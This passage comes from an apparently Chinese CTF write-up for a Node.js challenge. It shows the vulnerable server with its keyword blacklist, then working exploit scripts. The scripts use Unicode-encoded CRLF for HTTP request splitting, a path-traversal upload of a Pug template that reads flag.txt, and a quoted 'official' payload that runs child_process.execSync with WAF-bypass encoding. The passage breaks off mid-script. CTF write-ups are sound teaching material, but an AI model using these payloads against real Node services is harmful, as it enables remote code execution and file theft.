</span></span><span style=display:flex><span>                        <span style=color:#111>}</span><span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                            <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>message</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#111>}).</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>message</span><span style=color:#111>);});</span>
</span></span><span style=display:flex><span>                <span style=color:#111>});</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span> <span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#d88200>&#34;search param &#39;q&#39; missing!&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>function</span> <span style=color:#75af00>blacklist</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span> <span style=color:#111>{</span>	<span style=color:#75715e>// urlencode绕过 字符串拼接绕过 unicode绕过
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>evilwords</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#34;global&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;mainModule&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;require&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;root&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;child_process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;\&#34;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;&#39;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;!&#34;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>arrayLen</span> <span style=color:#f92672>=</span> <span style=color:#75af00>evilwords</span><span style=color:#111>.</span><span style=color:#75af00>length</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>var</span> <span style=color:#75af00>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#75af00>arrayLen</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>const</span> <span style=color:#75af00>trigger</span> <span style=color:#f92672>=</span> <span style=color:#75af00>url</span><span style=color:#111>.</span><span style=color:#75af00>includes</span><span style=color:#111>(</span><span style=color:#75af00>evilwords</span><span style=color:#111>[</span><span style=color:#75af00>i</span><span style=color:#111>]);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>trigger</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>8081</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>host</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>address</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>port</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Example app listening at http://%s:%s&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>host</span><span style=color:#111>,</span> <span style=color:#75af00>port</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span></code></pre></div><p>有上面两个题的铺垫，这个代码就会好理解一些</p><p>这个题改编的地方在于多了一个任意文件上传，可以通过<code>../</code>的mimetype来进行目录穿越，pug渲染会借助我们上传的.pug模板，在这里包含flag.txt</p><p>通过抓包修改内容来做payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#75af00>POST</span> <span style=color:#111>/file_upload</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span><span style=color:#111>Host</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>amiz</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>266</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Type</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf</span>
</span></span><span style=display:flex><span><span style=color:#111>Cache-control</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>no-cache</span>
</span></span><span style=display:flex><span><span style=color:#111>Connection</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>keep-alive</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>------WebKitFormBoundary4RZFWBFQ4MBn61cf
</span></span><span style=display:flex><span>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;amiz.pug&#34;
</span></span><span style=display:flex><span>Content-Type: /../template
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>doctype html
</span></span><span style=display:flex><span>html
</span></span><span style=display:flex><span>  head
</span></span><span style=display:flex><span>    style
</span></span><span style=display:flex><span>      include ../../../../../../../flag.txt
</span></span><span style=display:flex><span>------WebKitFormBoundary4RZFWBFQ4MBn61cf--
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GET /flag HTTP/1.1
</span></span><span style=display:flex><span>Host: amiz
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>amiz:
</span></span></code></pre></div><p>使用上面我们已经构造好的通用exp.py构造payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> <span style=color:#111>requests.utils</span> <span style=color:#f92672>import</span> <span style=color:#111>quote</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>SPACE</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u0120</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>CRLF</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u010d\u010a</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>SLASH</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u012f</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>DOUBLE_MARK</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u0122</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>SINGLE_MARK</span> <span style=color:#f92672>=</span> <span style=color:#d88200>u</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\u0127</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>_payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;&#39;HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>POST /file_upload HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Length: 266
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
</span></span></span><span style=display:flex><span><span style=color:#d88200>Cache-control: no-cache
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>------WebKitFormBoundary4RZFWBFQ4MBn61cf
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;amiz.pug&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: /../template
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>doctype html
</span></span></span><span style=display:flex><span><span style=color:#d88200>html
</span></span></span><span style=display:flex><span><span style=color:#d88200>  head
</span></span></span><span style=display:flex><span><span style=color:#d88200>    style
</span></span></span><span style=display:flex><span><span style=color:#d88200>      include ../../../../../../../flag.txt
</span></span></span><span style=display:flex><span><span style=color:#d88200>------WebKitFormBoundary4RZFWBFQ4MBn61cf--
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>GET /flag HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: close
</span></span></span><span style=display:flex><span><span style=color:#d88200>amiz: &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>_payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39; &#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>SPACE</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>CRLF</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>SLASH</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;&#34;&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>DOUBLE_MARK</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#39;&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>{</span><span style=color:#111>SINGLE_MARK</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>result</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>url</span> <span style=color:#f92672>+</span> <span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png alt=image-20211206133327186></p><p>成功得到flag，本地抓包看一下具体情况</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png alt=image-20211207011253660></p><p>在exp中我们对一些特殊字符做了unicode编码，被编码的字符应该包括以下这些</p><pre tabindex=0><code>! &amp; ` ; + \ / &#34; &#39; &lt;SPACE&gt; &lt;CRLF&gt;
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png alt=image-20211206133438315></p><p>（！！！注意 这里很可能有遗漏或者不必要的 请根据实际情况修改</p><p>下面是完全编码的exp.py</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>urllib.parse</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>_payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;&#39;amiz HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>POST /file_upload HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: amiz
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Length: 266
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
</span></span></span><span style=display:flex><span><span style=color:#d88200>Cache-control: no-cache
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: keep-alive
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>------WebKitFormBoundary4RZFWBFQ4MBn61cf
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;amiz.pug&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: ../template
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>doctype html
</span></span></span><span style=display:flex><span><span style=color:#d88200>html
</span></span></span><span style=display:flex><span><span style=color:#d88200>  head
</span></span></span><span style=display:flex><span><span style=color:#d88200>    style
</span></span></span><span style=display:flex><span><span style=color:#d88200>      include ../../../../../../../flag.txt
</span></span></span><span style=display:flex><span><span style=color:#d88200>------WebKitFormBoundary4RZFWBFQ4MBn61cf--
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>_payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#111>chr</span><span style=color:#111>(</span><span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0xff&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>hex</span><span style=color:#111>(</span><span style=color:#111>ord</span><span style=color:#111>(</span><span style=color:#111>c</span><span style=color:#111>))[</span><span style=color:#ae81ff>2</span><span style=color:#111>:]</span><span style=color:#f92672>.</span><span style=color:#111>zfill</span><span style=color:#111>(</span><span style=color:#ae81ff>2</span><span style=color:#111>),</span> <span style=color:#ae81ff>16</span><span style=color:#111>))</span> <span style=color:#00a8c8>for</span> <span style=color:#111>c</span> <span style=color:#f92672>in</span> <span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=&#39;</span> <span style=color:#f92672>+</span> <span style=color:#111>urllib</span><span style=color:#f92672>.</span><span style=color:#111>parse</span><span style=color:#f92672>.</span><span style=color:#111>quote</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
</span></span></code></pre></div><p>将会构造出这种玩意</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png alt=image-20211206133631155></p><p>另外pug模板除了包含flag.txt以外还可以跟上面nullcon的题一样用curl请求来外带flag；稍微修改一下exp即可</p><p>放一下<a href=https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game>官方exp.py</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>sys</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>payloadRaw</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;&#34;x HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>POST /file_upload HTTP/1.1
</span></span></span><span style=display:flex><span><span style=color:#d88200>Host: localhost:8081
</span></span></span><span style=display:flex><span><span style=color:#d88200>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
</span></span></span><span style=display:flex><span><span style=color:#d88200>Accept-Encoding: gzip, deflate
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Length: 6279
</span></span></span><span style=display:flex><span><span style=color:#d88200>Origin: http://localhost:8081
</span></span></span><span style=display:flex><span><span style=color:#d88200>Connection: close
</span></span></span><span style=display:flex><span><span style=color:#d88200>Referer: http://localhost:8081/?action=upload
</span></span></span><span style=display:flex><span><span style=color:#d88200>Upgrade-Insecure-Requests: 1
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>-----------------------------12837266501973088788260782942
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;5am3_get_flag.pug&#34;
</span></span></span><span style=display:flex><span><span style=color:#d88200>Content-Type: ../template
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;evalcmd&#39;)
</span></span></span><span style=display:flex><span><span style=color:#d88200>-----------------------------12837266501973088788260782942--
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>
</span></span></span><span style=display:flex><span><span style=color:#d88200>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>getParm</span><span style=color:#111>(</span><span style=color:#111>payload</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34; &#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C4%A0&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C4%8D%C4%8A&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C4%A2&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&#39;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C4%A7&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;`&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%A0&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;!&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C4%A1&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;+&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%2B&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%3B&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;&amp;&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%26&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Bypass Waf</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;global&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;process&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;mainModule&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;require&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&#34;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>payload</span><span style=color:#f92672>.</span><span style=color:#111>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#34;root&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;%C5%B2%C5%AF%C5%AF%C5%B4&#34;</span><span style=color:#111>)</span>
